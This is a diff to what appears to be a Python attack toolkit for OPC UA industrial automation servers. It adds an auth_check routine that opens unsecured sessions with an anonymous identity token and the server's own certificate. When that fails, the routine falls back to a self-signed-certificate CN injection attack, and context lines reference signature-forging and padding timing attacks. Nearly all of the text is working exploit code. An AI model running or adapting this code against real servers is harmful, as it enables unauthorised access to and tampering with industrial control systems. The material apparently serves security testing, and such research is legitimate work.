@@ -87,7 +87,7 @@ def connect_and_hello(host : str, port : int) -> socket:
     version=0,
     receiveBufferSize=2**16,
     sendBufferSize=2**16,
-    maxMessageSize=2**24,
+    maxMessageSize=2097152, #2**24,
     maxChunkCount=2**8,
     endpointUrl=f'opc.tcp://{host}:{port}/',
   ), AckMessage())
@@ -1077,7 +1077,7 @@ def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_passw
   return sig
   
 def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):  
-  log(f'Attempting reflection attack against {url}')
+  log(f'Attempting to log in to {url} with CN {cn} in self-signed certificate.')
   
   mycert, privkey = selfsign_cert(SELFSIGNED_CERT_TEMPLATE, cn, datetime.now() + timedelta(days=100))
   log(f'Generated self-signed certificate with CN {cn}.')
@@ -1390,3 +1390,57 @@ def server_checker(url : str, test_timing_attack : bool):
       log_success(f'Average time with incorrect padding: {nok_time / nokpads}')
       log_success(f'Longest time with incorrect padding: {maxnok}')
 
+
+def auth_check(url : str, skip_none : bool, demo : bool):
+  # Tests whether server allows authentication at all.
+  endpoints = get_endpoints(url)
+  
+  chan, token = None, None
+  if not skip_none:
+    for ep in endpoints:
+      if ep.securityPolicyUri == SecurityPolicy.NONE:
+        try:
+          log(f'Trying to log in to None endpoint {ep.endpointUrl}')
+          proto, host, port = parse_endpoint_url(url)
+          chan = unencrypted_opn(connect_and_hello(host, port)) if proto == TransportProtocol.TCP_BINARY else url
+          createreply = generic_exchange(chan, SecurityPolicy.NONE, createSessionRequest, createSessionResponse, 
+            requestHeader=simple_requestheader(),
+            clientDescription=applicationDescription.create(
+              applicationUri=TEMPLATE_APP_URI,
+              productUri=TEMPLATE_APP_URI,
+              applicationName=LocalizedText(text=TEMPLATE_APP_URI),
+              applicationType=ApplicationType.CLIENT,
+              gatewayServerUri=None,
+              discoveryProfileUri=None,
+              discoveryUrls=[],
+            ),
+            serverUri=ep.server.applicationUri,
+            endpointUrl=ep.endpointUrl,
+            sessionName=None,
+            clientNonce=None,
+            clientCertificate=ep.serverCertificate,
+            requestedSessionTimeout=600000,
+            maxResponseMessageSize=2**24,
+          )
+          
+          log(f'CreateSessionRequest succeeded. Now trying to activate it...')
+          activatereply = generic_exchange(chan, SecurityPolicy.NONE, activateSessionRequest, activateSessionResponse, 
+            requestHeader=simple_requestheader(createreply.authenticationToken),
+            clientSignature=signatureData.create(algorithm=None,signature=None),
+            clientSoftwareCertificates=[],
+            localeIds=[],
+            userIdentityToken=anonymousIdentityToken.create(policyId=anon_policies[0].policyId),
+            userTokenSignature=signatureData.create(algorithm=None,signature=None),
+          )
+          log_success('Session activation successful!')
+          if demo:
+            demonstrate_access(chan, createreply.authenticationToken, SecurityPolicy.NONE)
+          return
+        except ServerError as err:
+          log(f'Attempt failed due to server error {hex(err.errorcode)}: "{err.reason}"')
+        except Exception as ex:
+          log(f'Attempt failed due to Exception {type(ex).__name__}: "{ex}"')
+  
+  log('Anonymous login didn\'t work. Trying self-signed certificate next.')
+  inject_cn_attack(url, TEMPLATE_APP_URI, False, demo)
+  
